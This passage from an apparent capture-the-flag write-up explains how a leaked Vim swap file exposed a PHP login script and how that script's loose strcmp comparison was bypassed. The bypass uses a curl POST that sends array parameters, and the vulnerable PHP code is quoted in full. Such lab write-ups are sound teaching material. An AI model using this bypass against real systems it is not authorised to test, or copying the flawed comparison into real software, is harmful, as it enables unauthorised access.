## Initial Foothold

### Finding the source via a leftover Vim swap file

Browsing `/login/` also returned a directory listing:

```
Index of /login
config.php
login.php
login.php.swp
```

The `login.php.swp` file is a Vim swap file — an editor artifact accidentally left on the server. Downloading it and running `strings` on it recovered the working source of `login.php`:

```php
<?php
session_start();
require('config.php');
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
```

### PHP type-juggling authentication bypass

The login logic compares user-supplied credentials against the real ones using `strcmp()`. In PHP, `strcmp()` expects two strings. If instead it is passed an **array**, it cannot perform the comparison and returns `NULL`. Due to PHP's loose (`==`) comparison rules, `NULL == 0` evaluates to `true` — so the check silently passes.

By submitting the username and password as **array parameters** rather than strings (appending `[]` to the field names in the POST body), the comparison breaks in the attacker's favor:

```bash
curl -i -X POST http://10.129.47.59/login/login.php -d "username[]=x&password[]=x"
```

This bypassed authentication entirely (no valid credentials required) and returned a redirect to `/upload.php`, confirming access to the authenticated upload interface.

